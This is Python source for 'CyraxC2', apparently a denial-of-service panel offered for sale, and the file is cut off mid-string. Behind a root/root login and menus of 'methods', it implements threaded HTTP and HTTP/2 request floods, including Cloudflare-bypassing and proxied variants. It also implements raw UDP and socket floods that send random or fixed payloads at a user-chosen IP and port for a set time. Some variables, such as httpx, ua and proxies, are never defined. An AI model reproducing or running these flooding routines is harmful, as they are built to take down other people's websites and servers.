import random
import threading
import socket
import os,sys
import time
import getpass
from sys import stdout
from colorama import Fore, init
import cloudscraper, datetime, socket, ssl
import random
from colorama import Fore, Style
import asyncio
import os
import datetime

content = "Someone Just Login In CyraxC2"

prot = (random.randint(2,4))
sys.stdout.write("\x1b]2;Cyrax C2 |  Online User : [9] | Username: [root] | Devices : 89 | Expire : [UNLIMITED] \x07".format (prot))
        
os.system("clear")
username = str(input("\033[33m \033[95mUsername:\033[37m"))
password = str(input("\033[33m \033[95mPassword:\033[37m"))
if password == "root" and username == "root":
    print (f"\033[92mLogged in as {username}")
    time.sleep(1)

else:
    print ("\033[31mIncorrect Password. Please try again.")
    time.sleep(99999)

os.system("clear")
rulesstart = str(input("""

        \033[31m╦═╗╦ ╦╦  ╔═╗╔═╗
        \033[37m╠╦╝║ ║║  ║╣ ╚═╗
        \033[31m╩╚═╚═╝╩═╝╚═╝╚═╝
\033[31m╔═══════════════════════════════════════════╗
\033[31m║\033[37m 1. No Attacks Over 120 Seconds.           \033[31m║
\033[31m║\033[37m 2. No Spamming Attacks.                   \033[31m║
\033[31m║\033[37m 3. No Attacks To Any Government Websites. \033[31m║
\033[31m║\033[37m 4. No Sharing Logins.                     \033[31m║
\033[31m║\033[37m 5. No Giving Out The Server IP.           \033[31m║
\033[31m║\033[37m 6. Dont Attacking .edu / .gov website     \033[31m║
\033[31m║\033[37m 7. Dont Share CyraxC2                     \033[31m║
\033[31m╚═══════════════════════════════════════════╝
\033[37m Do You Understand The Rules? [y/N] """))
if rulesstart == "y":
    print (f"\033[37m ")
    time.sleep(2)


else:
    print ("\033[37mREAD THE FUCKING RULES AGAIN")
    time.sleep(2)
    exit()


os.system("clear")
print("\033[92mConnecting To Server [\033[37m•\033[92m]")
time.sleep(0.9)

os.system("clear")
print("Connecting To Server [\033[37m••\033[92m]")
time.sleep(0.9)

os.system("clear")
print("Connecting To Server [\033[37m•••\033[92m]")
time.sleep(0.9)

os.system("clear")
print("Connecting To Server [\033[37m••\033[92m]")
time.sleep(0.9)

os.system("clear")
print("Connecting To Server [\033[37m•\033[92m]")
time.sleep(0.9)

nicknm = "Cyrax"

mt = """\033[96mService under \033[0;31mmaintance"""

#custom methods
custom = """
\033[31m[\033[31m•\033[31m] \033[31mdstats-\033[31ml7
\033[31m[\033[31m•\033[31m] \033[31mdstats-\033[31ml4
"""
layer4 = """\033[31m\033[91m             ╦══╩══════════════0══════════════════╩══╦
\033[91m                        ▄▌   ▄▄▄·  ▄· ▄▌▄▄▄ .▄▄▄  
\033[37m                       ██•  ▐█ ▀█ ▐█▪██▌▀▄.▀·▀▄ █·
\033[37m                       ██▪  ▄█▀▀█ ▐█▌▐█▪▐▀▀▪▄▐▀▀▄ 
\033[91m                       ▐█▌▐▌▐█ ▪▐▌ ▐█▀·.▐█▄▄▌▐█•█▌
\033[91m                       .▀▀▀  ▀  ▀   ▀ •  ▀▀▀ .▀  ▀4
\033[91m             ╩══╦══════════════0══════════════════╦══╩
\033[91m      ╔═════════╩═════════════════════════════════╩═════════╗          
\033[37m                      udp        \033[37m[FREE] \033[37m(L4) (120)
\033[37m                      udpdown    \033[37m[FREE] \033[37m(L4) (120)
\033[37m                      udpkill    \033[37m[FREE] \033[37m(L4) (120)
\033[37m                      syn        \033[37m[FREE] \033[37m(L4) (120)
\033[37m                      ovh        \033[37m[FREE] \033[37m(L4) (120)
\033[37m                      tcp        \033[37m[FREE] \033[37m(L4) (120)
\033[37m                      dns        \033[93m[VIP]  \033[37m(L4) (120)
\033[37m                      tcpraw     \033[93m[VIP]  \033[37m(L4) (120)
\033[37m                      tcprape    \033[93m[VIP]  \033[37m(L4) (120)
\033[37m                      ovhkill    \033[93m[VIP]  \033[37m(L4) (120)
\033[37m                      udpbypass  \033[93m[VIP]  \033[37m(L4) (120)
\033[37m                      tcpdown    \033[93m[VIP]  \033[37m(L4) (120)
\033[91m      ╠═════════╦══════════════$══════════════════╦═════════╣
\033[91m             ╦══╩═════════════════════════════════╩══╦"""

methods = """
\033[91m                        ╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔═╗
\033[37m                        ║║║║╣  ║ ╠═╣║ ║ ║║╚═╗
\033[91m                        ╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝
\033[91m╔═════════════════════════════════════════════════════════
\033[91m║ \033[37mudp        \033[37m[FREE] \033[37m(L4) (120)
\033[91m║ \033[37mudpdown    \033[37m[FREE] \033[37m(L4) (120)
\033[91m║ \033[37msyn        \033[37m[FREE] \033[37m(L4) (120)
\033[91m║ \033[37movh        \033[37m[FREE] \033[37m(L4) (120)
\033[91m║ \033[37mtcp        \033[37m[FREE] \033[37m(L4) (120)
\033[91m║ \033[37movhkill    \033[93m[VIP]  \033[37m(L4) (120)
\033[91m║ \033[37mudpbypass  \033[93m[VIP]  \033[37m(L4) (120)
\033[91m║ \033[37mtcpdown    \033[93m[VIP]  \033[37m(L4) (120)
\033[91m╚═════════════════════════════════════════════════════════
\033[91m║ \033[37mhttpstm    \033[37m[FREE] \033[37m(L7) (120)
\033[91m║ \033[37mhome       \033[37m[FREE] \033[37m(L7) (120)
\033[91m║ \033[37mcf         \033[37m[FREE] \033[37m(L7) (120)
\033[91m║ \033[37mhttp       \033[37m[FREE] \033[37m(L7) (120)
\033[91m║ \033[37movh        \033[37m[FREE] \033[37m(L7) (120)
\033[91m║ \033[37mstresster  \033[37m[FREE] \033[37m(L7) (120)
\033[91m║ \033[37mhttpcld    \033[93m[VIP]  \033[37m(L7) (120)
\033[91m║ \033[37mcfb        \033[93m[VIP]  \033[37m(L7) (120)
\033[91m║ \033[37mddosguard  \033[93m[VIP]  \033[37m(L7) (120)
\033[91m║ \033[37movhdown    \033[93m[VIP]  \033[37m(L7) (120)
\033[91m╚═════════════════════════════════════════════════════════
"""

ticket = """\033[96m For Ticket You Can Join Our Discord Server. \033[31mhttps://discord.cyraxnet.xyz/"""

banner =  """\033[37m|\033[37mCyraxC2\033[37m| \033[37m| VIP ACCESS\033[37m: [\033[92mTRUE\033[37m] |  \033[37mDISCORD\033[37m: [\033[37mDewaa#6666\033[37m] \033[37m| \033[37mEnjoy!~

\033[31m       ░█████╗░██╗░░░██╗██████╗░░█████╗░██╗░░██╗
\033[37m      ██╔══██╗╚██╗░██╔╝██╔══██╗██╔══██╗╚██╗██╔╝
\033[37m      ██║░░╚═╝░╚████╔╝░██████╔╝███████║░╚███╔╝░
\033[37m      ██║░░██╗░░╚██╔╝░░██╔══██╗██╔══██║░██╔██╗░
\033[31m      ╚█████╔╝░░░██║░░░██║░░██║██║░░██║██╔╝╚██╗
\033[31m      ░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝
\033[37m              \033[91m⚡ \033[37mCyrax C2 MADE BY Dewxx \033[91m⚡
\033[31m        ══╦═════════════════════════════════╦══
\033[31m╔═════════╩═════════════════════════════════╩═════════╗
\033[31m║              \033[37mWelcome To CyraxC2                     \033[31m║
\033[31m║ \033[37mType "help" \033[37mFor Help . If you wanna buy CyraxC2     \033[31m║
\033[31m║ \033[37mContact Dewaa#6666 / Vinzz#5555                     \033[31m║
\033[31m╚═══╦════════════════════════════════════════════╦════╝
\033[31m   ╔╩════════════════════════════════════════════╩╗
\033[31m   ║\033[37mHow To attack: \033[37m[\033[31mMETHOD\033[37m]  \033[37m[\033[31mIP\033[37m] \033[37m[\033[31mTIME\033[37m] [\033[31mPORT\033[37m].  \033[31m║
\033[31m   ║\033[37mCopyrigtht © CyraxC2 2023 All Rights Reserved \033[31m║
\033[31m   ╚══════════════════════════════════════════════╝
"""

attacked =  """\033[37m[INFO] Attack Was Success!!"""


helpservice =  """\033[31m             ╦══╩══════════════0══════════════════╩══╦
    \033[31m                     ▄ .▄▄▄▄ .▄▄▌   ▄▄▄·
    \033[31m                    ██▪▐█▀▄.▀·██•  ▐█ ▄█
    \033[37m                    ██▀▐█▐▀▀▪▄██▪   ██▀·
    \033[31m                    ██▌▐▀▐█▄▄▌▐█▌▐▌▐█▪·•
    \033[31m                    ▀▀▀ · ▀▀▀ .▀▀▀ .▀   
\033[31m             ╩══╦══════════════0══════════════════╦══╩
\033[31m      ╔═════════╩═════════════════════════════════╩═════════╗
\033[31m    
\033[37m         layer7               : \033[37mShow Layer7 Command
\033[37m         layer4               : \033[37mShow Layer4 Command
\033[37m         methods              : \033[37mShow All Methods in CyraxC2
\033[37m         plan                 : \033[37mShow Your Plan
\033[37m         rules                : \033[37mShow Rules
\033[31m    
\033[31m                   \033[93mϟ  \033[37mMade By : Dewxxx \033[93mϟ 
\033[31m                             
\033[31m      ╠═════════╦══════════════$══════════════════╦═════════╣
\033[31m             ╦══╩═════════════════════════════════╩══╦
\033[37m            Copyrigtht © CyraxC2 2023 All Rights Reserved
\033[31m             ╩═══════════════════════════════════════╩"""

layer7 = """\033[31m
\033[91m             ╦══╩══════════════0══════════════════╩══╦
\033[91m                        ▄▌   ▄▄▄·  ▄· ▄▌▄▄▄ .▄▄▄  
\033[37m                       ██•  ▐█ ▀█ ▐█▪██▌▀▄.▀·▀▄ █·
\033[37m                       ██▪  ▄█▀▀█ ▐█▌▐█▪▐▀▀▪▄▐▀▀▄ 
\033[91m                       ▐█▌▐▌▐█ ▪▐▌ ▐█▀·.▐█▄▄▌▐█•█▌
\033[91m                       .▀▀▀  ▀  ▀   ▀ •  ▀▀▀ .▀  ▀7
\033[91m             ╩══╦══════════════0══════════════════╦══╩
\033[91m      ╔═════════╩═════════════════════════════════╩═════════╗          
\033[37m            httpstm    \033[37m[FREE] \033[37m(L7) (120)
\033[37m            home       \033[37m[FREE] \033[37m(L7) (120)
\033[37m            cf         \033[37m[FREE] \033[37m(L7) (120)
\033[37m            http       \033[37m[FREE] \033[37m(L7) (120)
\033[37m            ovh        \033[37m[FREE] \033[37m(L7) (120)
\033[37m            stresster  \033[37m[FREE] \033[37m(L7) (120)
\033[37m            httpcld    \033[93m[VIP]  \033[37m(L7) (120)
\033[37m            cfb        \033[93m[VIP]  \033[37m(L7) (120)
\033[37m            ddosguard  \033[93m[VIP]  \033[37m(L7) (120)
\033[37m            ovhdown    \033[93m[VIP]  \033[37m(L7) (120)
\033[37m            attack     \033[93m[VIP]  \033[37m(L7) (60)
\033[91m      ╠═════════╦══════════════$══════════════════╦═════════╣
\033[91m             ╦══╩═════════════════════════════════╩══╦
"""

cooldown = """
\033[0;96m      
\033[0;96m                               LOADING FOR MINUTES       
\033[0;96m                              
\033[0;96m =============Dewwxxx CREATED THIS DDOS======================"""
invalid = """\033[0;96mInvalid\033[0;31mCommands"""
cookie = open(".sinfull_cookie","w+")

plan =  f"""
\033[0;37m VIP = \033[95mTRUE
\033[0;37m USERNAME = \033[95m{username}                
\033[0;37m ADMIN = \033[95mTRUE
\033[0;37m EXPIRED TIME = \033[95mLIFETIME
\033[0;37m API ACCESS = \033[95mTRUE
"""

def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
        else:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack Done !                                   \n")
            return

def get_info():
    stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     "+Fore.RED+": "+Fore.WHITE)
    target = input()
    stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"THREAD  "+Fore.RED+": "+Fore.WHITE)
    thread = input()
    stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) "+Fore.RED+": "+Fore.WHITE)
    t = input()
    return target, thread, t
#endregion


def LaunchCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15)
            scraper.get(url, timeout=15)
        except:
            pass
#endregion

#region PXCFB
def LaunchPXCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackPXCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            proxy = {
                    'http': 'http://'+str(random.choice(list(proxies))),   
                    'https': 'http://'+str(random.choice(list(proxies))),
            }
            scraper.get(url, proxies=proxy)
            scraper.get(url, proxies=proxy)
        except:
            pass
#endregion

rules = """
\033[31m╔═══════════════════════════════════════════╗
\033[31m║\033[37m 1. No Attacks Over 120 Seconds.           \033[31m║
\033[31m║\033[37m 2. No Spamming Attacks.                   \033[31m║
\033[31m║\033[37m 3. No Attacks To Any Government Websites. \033[31m║
\033[31m║\033[37m 4. No Sharing Logins.                     \033[31m║
\033[31m║\033[37m 5. No Giving Out The Server IP.           \033[31m║
\033[31m╚═══════════════════════════════════════════╝
"""

def LaunchHTTP2(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackHTTP2, args=(url, until)).start()

def AttackHTTP2(url, until_datetime):
    headers = {
            'User-Agent': random.choice(ua),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'TE': 'trailers',
            }
    client = httpx.Client(http2=True)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            client.get(url, headers=headers)
            client.get(url, headers=headers)
        except:
            pass

def LaunchPXHTTP2(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackHTTP2, args=(url, until)).start()

def AttackPXHTTP2(url, until_datetime):
    headers = {
            'User-Agent': random.choice(ua),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'TE': 'trailers',
            }
    
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            client = httpx.Client(
                http2=True,
                proxies={
                    'http://': 'http://'+random.choice(proxies),
                    'https://': 'http://'+random.choice(proxies),
                }
             )
            client.get(url, headers=headers)
            client.get(url, headers=headers)
        except:
            pass


fsubs = True
tpings = True
pscans = True
liips = True
tattacks = True
uaid = True
said = True
running = True
iaid = True
haid = True
aid = True
attack = True
ldap = True
http = True
atks = True

def randsender(host, timer, port, punch):
    global iaid
    global aid
    global tattacks
    global running

    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

    iaid += 1
    aid += 1
    tattacks += 1
    running += 1
    while time.time() < timeout and ldap and attack:
        sock.sendto(punch, (host, int(port)))
    running -= 1
    iaid -= 1
    aid -= 1
              
              


def stdsender(host, port, timer, payload):
    global atks
    global running

    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
    atks -= 1
    running -= 1

def main():
    global fsubs
    global tpings
    global pscans
    global liips
    global tattacks
    global uaid
    global running
    global atk
    global ldap
    global said
    global iaid
    global haid
    global aid
    global attack
    global dp

    while True:
        powerran = (random.randint(1,3))
        sys.stdout.write(f"\x1b]2;Cyrax C2 | Online User : [8] | Username: [{username}] | Devices : 89 | Expire : [UNLIMITED] \x07".format (powerran))
        sin = input(f"\033[31m[\033[37m{username}@Cyrax\033[31m]\033[37m~$ \033[37m".format(nicknm)).lower()
        sinput = sin.split(" ")[0]

        if sinput == "clear":
            os.system ("clear")
            print (banner)
            main()

        elif sinput == "http" or sinput == "HTTP":
           target, thread, t = get_info()
           timer = threading.Thread(target=countdown, args=(t,))
           timer.start()
           LaunchHTTP2(target, thread, t)

           timer.join()


        if sinput == "rules":
            print(rules)
        if sinput == "custom-methods":
            os.system("clear")
            print (custom)
        if sinput == "methods":
            os.system ("clear")
            print (methods)
            main()
        if sinput == "method":
            os.system ("clear")
            print (methods)
            main()
        if sinput == "ticket":
            os.system ("clear")
            print (ticket)
            main()
        if sinput == "clear":
            os.system ("clear")
            print (banner)
            main()
        elif sinput == "?":
            os.system ("clear")
            print (helpservice)
            main()
        elif sinput == "help":
            os.system ('clear')
            print (helpservice)
            main()
        elif sinput == "":
            print(invalid)
            main()
        if sinput == "plan":
            os.system ("clear")
            print (plan)
            main()
        elif sinput == "leave":
            os.system("clear")
            exit()

        elif sinput == "layer4":
            os.system("clear")
            print(layer4)
            main()

        elif sinput == "layer7":
            os.system("clear")
            print(layer7)
            main()

        elif sinput == "attack":
            target, thread, t = get_info()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFB(target, thread, t)

        elif sinput == "udp":
            try:
                if running >= 9000000:
                    print("\033[31mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 1021
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(f"""
\033[31m╦═════════════════╦═══════════════════╦
        \033[31mTARGET: \033[31m[\033[37m%s\033[31m]  
        \033[31mPORT: \033[31m[\033[37m%s\033[31m]
        \033[31mTIME: \033[31m[\033[37m%s\033[31m]
        \033[31mMETHODS: \033[31m[\033[37mudp\033[31m]
        \033[31mUSERNAME: \033[31m[\033[37m{username}\033[31m]
        \033[31mVIP : \033[31m[\033[92mTRUE\033[31m\033[31m]

\033[31m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))

            except ValueError:
                main()
            except socket.gaierror:
                main()


        elif sinput == "dns":
            try:
                if running >= 9000000:
                    print("\033[31mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                    threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                    os.system("clear")
                    print(f"""
\033[31m╦═════════════════╦═══════════════════╦
        \033[31mTARGET: \033[31m[\033[37m%s\033[31m]  
        \033[31mPORT: \033[31m[\033[37m%s\033[31m]
        \033[31mTIME: \033[31m[\033[37m%s\033[31m]
        \033[31mMETHODS: \033[31m[\033[37mdns\033[31m]
        \033[31mUSERNAME: \033[31m[\033[37m{username}\033[31m]
        \033[31mVIP : \033[31m[\033[92mTRUE\033[31m\033[31m]

\033[31m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "syn":
            try:
                if running >= 1000:
                    print("\033[31mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                        sinput, host, timer, port = sin.split(" ")
                        socket.gethostbyname(host)
                        payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
                        threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                        os.system("clear")
                        print(f"""
\033[31m╦═════════════════╦═══════════════════╦
        \033[31mTARGET: \033[31m[\033[37m%s\033[31m]  
        \033[31mPORT: \033[31m[\033[37m%s\033[31m]
        \033[31mTIME: \033[31m[\033[37m%s\033[31m]
        \033[31mMETHODS: \033[31m[\033[37msyn\033[31m]
        \033[31mUSERNAME: \033[31m[\033[37m{username}\033[31m]
        \033[31mVIP : \033[31m[\033[92mTRUE\033[31m\033[31m]

\033[31m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))


            except ValueError: 
                main()
            except socket.gaierror:
                main()

        elif sinput == "udpbypass":
            try:
                if running >= 9000000:
                    print("\033[31mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 65500
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(f"""
\033[31m╦═════════════════╦═══════════════════╦
        \033[31mTARGET: \033[31m[\033[37m%s\033[31m]  
        \033[31mPORT: \033[31m[\033[37m%s\033[31m]
        \033[31mTIME: \033[31m[\033[37m%s\033[31m]
        \033[31mMETHODS: \033[31m[\033[37mudpbypass\033[31m]
        \033[31mUSERNAME: \033[31m[\033[37m{username}\033[31m]
        \033[31mVIP : \033[31m[\033[92mTRUE\033[31m\033[31m]

\033[31m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))                    
                   
            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "tcp":
            try:
                if running >= 9000000:
                    print("\033[31mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 20179
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(f"""
\033[31m╦═════════════════╦═══════════════════╦
        \033[31mTARGET: \033[31m[\033[37m%s\033[31m]  
        \033[31mPORT: \033[31m[\033[37m%s\033[31m]
        \033[31mTIME: \033[31m[\033[37m%s\033[31m]
        \033[31mMETHODS: \033[31m[\033[37mtcp\033[31m]
        \033[31mUSERNAME: \033[31m[\033[37m{username}\033[31m]
        \033[31mVIP : \033[31m[\033[92mTRUE\033[31m\033[31m]

\033[31m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))                    

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "cf":
            try:
                if running >= 9000000:
                    print("\033[31mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 65500
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(f"""
\033[31m╦═════════════════╦═══════════════════╦
        \033[31mTARGET: \033[31m[\033[37m%s\033[31m]  
        \033[31mPORT: \033[31m[\033[37m%s\033[31m]
        \033[31mTIME: \033[31m[\033[37m%s\033[31m]
        \033[31mMETHODS: \033[31m[\033[37mcf\033[31m]
        \033[31mUSERNAME: \033[31m[\033[37m{username}\033[31m]
        \033[31mVIP : \033[31m[\033[92mTRUE\033[31m\033[31m]

\033[31m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))
                    
            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "ovh":
            try:
                if running >= 9000000:
                    print("\033[31mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                        sinput, host, timer, port = sin.split(" ")
                        socket.gethostbyname(host)
                        payload = b"\x00\x02\x00\x2f"
                        threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                        os.system("clear")
                        print(f"""
\033[31m╦═════════════════╦═══════════════════╦
        \033[31mTARGET: \033[31m[\033[37m%s\033[31m]  
        \033[31mPORT: \033[31m[\033[37m%s\033[31m]
        \033[31mTIME: \033[31m[\033[37m%s\033[31m]
        \033[31mMETHODS: \033[31m[\033[37movh\033[31m]
        \033[31mUSERNAME: \033[31m[\033[37m{username}\033[31m]
        \033[31mVIP : \033[31m[\033[92mTRUE\033[31m\033[31m]

\033[31m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))                    


            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "cfb":
            try:
                if running >= 9000000:
                    print("\033[31mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 65500
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(f"""
\033[31m╦═════════════════╦═══════════════════╦
        \033[31mTARGET: \033[31m[\033[37m%s\033[31m]  
        \033[31mPORT: \033[31m[\033[37m%s\033[31m]
        \033[31mTIME: \033[31m[\033[37m%s\033[31m]
        \033[31mMETHODS: \033[31m[\033[37mcfb\033[31m]
        \033[31mUSERNAME: \033[31m[\033[37m{username}\033[31m]
        \033[31mVIP : \033[31m[\033[92mTRUE\033[31m\033[31m]

\033[31m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))                 
                    
            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "ovhkill":
            try:
                if running >= 9000000:
                    print("\033[31mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                    threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()               
                    os.system("clear")
                    print(f"""
\033[31m╦═════════════════╦═══════════════════╦
        \033[31mTARGET: \033[31m[\033[37m%s\033[31m]  
        \033[31mPORT: \033[31m[\033[37m%s\033[31m]
        \033[31mTIME: \033[31m[\033[37m%s\033[31m]
        \033[31mMETHODS: \033[31m[\033[37movhkill\033[31m]
        \033[31mUSERNAME: \033[31m[\033[37m{username}\033[31m]
        \033[31mVIP : \033[31m[\033[92mTRUE\033[31m\033[31m]

\033[31m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))
                    
            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "ovhdown":
            try:
                if running >= 120345:
                    print("\033[31mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                    threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                    os.system("clear")
                    print(f"""
\033[31m╦═════════════════╦═══════════════════╦
        \033[31mTARGET: \033[31m[\033[37m%s\033[31m]  
        \033[31mPORT: \033[31m[\033[37m%s\033[31m]
        \033[31mTIME: \033[31m[\033[37m%s\033[31m]
        \033[31mMETHODS: \033[31m[\033[37movhdown\033[31m]
        \033[31mUSERNAME: \033[31m[\033[37m{username}\033[31m]
        \033[31mVIP : \033[31m[\033[92mTRUE\033[31m\033[31m]

\033[31m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))
                    
            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "home":
            try:
                if running >= 9000000:
                    print("\033[31mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 6048
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(f"""
\033[31m╦═════════════════╦═══════════════════╦
        \033[31mTARGET: \033[31m[\033[37m%s\033[31m]  
        \033[31mPORT: \033[31m[\033[37m%s\033[31m]
        \033[31mTIME: \033[31m[\033[37m%s\033[31m]
        \033[31mMETHODS: \033[31m[\033[37mhome\033[31m]
        \033[31mUSERNAME: \033[31m[\033[37m{username}\033[31m]
        \033[31mVIP : \033[31m[\033[92mTRUE\033[31m\033[31m]

\033[31m╩═══════════════════╩═════════════════╩
                        """%(host,port,timer))                    
                    
            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "stresster":
            try:
                if running >= 9000000:
                    print("\033[31mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 6048
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()

                    os.system("clear")
                    print(f"""
\033[31m╦═════════════════╦═══════════════════╦
        \033[31mTARGET: \033[31m[\033[37m%s\033[31m]  
        \033[31mPORT: \033[31m[\033[37m%s\033[31m]
        \033[31mTIME: \033[31m[\033[37m%s\033[31m]
